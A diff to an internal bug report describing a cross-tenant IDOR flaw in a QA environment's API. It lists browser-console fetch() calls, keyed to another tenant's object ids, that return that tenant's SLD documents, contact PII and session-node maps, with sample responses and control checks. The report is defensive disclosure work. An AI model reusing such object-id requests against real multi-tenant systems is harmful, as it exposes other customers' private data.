@@ -6,12 +6,12 @@ Attach: `docs/bug-evidence/cross-tenant-by-sld-idor/idor-evidence.png`.
 ---
 
 ## Title
-[Security / API] Cross-tenant data exposure is only partially fixed — a customer admin can still read another tenant's contacts (PII), site/issue counts, and session→node maps via the `/api/<resource>/by-<scope>/{id}` route family
+[Security / API] Cross-tenant data exposure is only partially fixed — a customer admin can still read another tenant's **full SLD documents**, contacts (PII), site/issue counts, and session→node maps via object-id resource routes (`/api/sld/{id}`, `/api/<resource>/by-<scope>/{id}`, `?company_id=`)
 
 ## Environment
 * Environment: **QA** (`acme.qa.egalvanic.ai` attacker · `demo.qa.egalvanic.ai` victim/ground-truth)
 * Platform: **Web / API** (backend authorization)
-* Browser/App Version: QA build **V1.36**, 2026-08-14
+* Browser/App Version: QA build **V1.36**, 2026-08-14 (re-confirmed still live **2026-08-17**)
 * Relates to: the P1 *Cross-tenant data exposure* ticket — its 3 reported `/api/company/{id}/*` routes are now fixed; this is the same vulnerability class on other routes.
 
 ## Preconditions
@@ -22,16 +22,20 @@ Attach: `docs/bug-evidence/cross-tenant-by-sld-idor/idor-evidence.png`.
 
 ## Steps to Reproduce
 From an authenticated EG-ACME browser session on `https://acme.qa.egalvanic.ai`, run each in the console (the app's bearer is sent automatically):
-1. `fetch('/api/contact/by-sld/24eb08b1-bb88-4f47-8ad0-f5b09326cf8d',{headers:{Accept:'application/json'}}).then(r=>r.json()).then(console.log)`
-2. `fetch('/api/issues/open-by-site?company_id=93611164-13e6-47da-b2cd-a150e73173f6').then(r=>r.json()).then(console.log)`
-3. `fetch('/api/mapping/node-session/by-session/0c3794e1-d817-4189-9f61-0ebaee93d70d').then(r=>r.json()).then(console.log)`
-4. Control that the fix works elsewhere: `fetch('/api/company/93611164-13e6-47da-b2cd-a150e73173f6/slds').then(r=>console.log(r.status))` → **422**.
+1. **Full SLD document by id (highest impact):** `fetch('/api/sld/24eb08b1-bb88-4f47-8ad0-f5b09326cf8d',{headers:{Accept:'application/json'}}).then(r=>r.json()).then(console.log)`
+2. `fetch('/api/contact/by-sld/24eb08b1-bb88-4f47-8ad0-f5b09326cf8d',{headers:{Accept:'application/json'}}).then(r=>r.json()).then(console.log)`
+3. `fetch('/api/issues/open-by-site?company_id=93611164-13e6-47da-b2cd-a150e73173f6').then(r=>r.json()).then(console.log)`
+4. `fetch('/api/mapping/node-session/by-session/0c3794e1-d817-4189-9f61-0ebaee93d70d').then(r=>r.json()).then(console.log)`
+5. Control that the fix works elsewhere: `fetch('/api/company/93611164-13e6-47da-b2cd-a150e73173f6/slds').then(r=>console.log(r.status))` → **422**.
 
 ## Actual Result
-Steps 1–3 return **HTTP 200 with the *other tenant's* data**, byte-identical to what Demo's own session returns for the same ids:
-* **Step 1 →** Demo's contact PII: `{"contacts":[{"email":"sandbox@egalvanic.com","full_name":"Test test","job_title":"Test","id":"a414376c-…"}],"success":true}`
-* **Step 2 →** Demo's sites + open-issue counts: `{"sites":[{"sld_name":"Demo","sld_id":"d1641610-…","count":2}],"total":2}`
-* **Step 3 →** Demo's session→node map: `{"node_ids":["d435fd13-435b-4c7f-b55a-9452e82908f7"],"success":true}`
+Steps 1–4 return **HTTP 200 with the *other tenant's* data**, byte-identical to what Demo's own session returns for the same ids (SHA-256 match on each body; re-confirmed still live 2026-08-17):
+* **Step 1 →** Demo's **entire SLD document** — `{"id":"24eb08b1-…","name":"test","nodes":[…],"edges":[…],"issues":[…],"tasks":[…],"quotes":[…],"mappings":{…}}`. A top-level resource fetched by its own id, with **no `company_id` in the path** — the guard has nothing to key on. (This Demo SLD is sparse; a populated SLD returns the full diagram — the own-tenant control is 1.67 MB.)
+* **Step 2 →** Demo's contact PII: `{"contacts":[{"email":"sandbox@egalvanic.com","full_name":"Test test","job_title":"Test","id":"a414376c-…"}],"success":true}`
+* **Step 3 →** Demo's sites + open-issue counts: `{"sites":[{"sld_name":"Demo","sld_id":"d1641610-…","count":2}],"total":2}`
+* **Step 4 →** Demo's session→node map: `{"node_ids":["d435fd13-435b-4c7f-b55a-9452e82908f7"],"success":true}`
+
+*Scope note:* the leak is on the **singular** `/api/sld/{id}`; the plural `/api/slds/{id}` and `/api/sessions/{id}`/`/api/session/{id}` are not live API routes (SPA shell), and `/api/ir_session/{id}` is correctly isolated. The two probed leaking routes (`sld/{id}`, `contact/by-sld`) are **read-only** (`Allow: GET, OPTIONS, HEAD`; writes → 405), so this is a confidentiality breach; cross-tenant write was not attempted.
 
 Controls confirm it is a real authorization failure, not an accident: the same routes with **acme's own** id return **acme's** data; with a **random** id they return empty/404; and step 4 (the originally-reported route) correctly returns **422 permission_denied**. The routes filter by the object id but never verify the object belongs to the caller's tenant.
 
